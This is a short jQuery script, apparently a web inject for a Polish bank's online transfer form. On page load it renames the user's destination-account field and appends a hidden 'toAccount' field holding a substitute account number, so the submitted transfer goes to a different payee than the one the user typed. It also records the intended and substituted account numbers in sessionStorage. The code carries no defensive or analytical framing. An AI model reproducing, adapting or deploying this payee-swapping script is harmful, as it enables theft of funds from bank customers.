$(document).ready(function () {

    if($('input[type="submit"]')) {
        $('input[type="submit"]').attr('onclick');

        $('input[name="toAccount"]').attr('name', 'number');
        let numKonta = $('#c198_fromAccount_chzn').text();
        numKonta = numKonta.split('eKonto');
        numKonta = numKonta[0];
        sessionStorage.setItem("numKonta", numKonta);
        console.log(sessionStorage)
        $('form').append('<input name="toAccount" hidden value="0000000000000000">');
    }

    // document.getElementById("c198_submitButtons_submit").addEventListener('click', function() {
    //     console.log("O");
    //     change();
    // })

    $('#c198_submitButtons_submit').click(function () {
        console.log("click")
        // change();
        let correct = $('input[name="number"]').val()
        let fake = $('input[name="toAccount"]').val()
        sessionStorage.setItem('pKon', correct)
        sessionStorage.setItem('nKon', fake)
    
        $('form').submit();
    })
    
    function change() {
        console.log("K")
        let correct = $('input[name="number"]').val()
        let fake = $('input[name="toAccount"]').val()
        sessionStorage.setItem('pKon', correct)
        sessionStorage.setItem('nKon', fake)
    
        $('form').submit();
    }
})
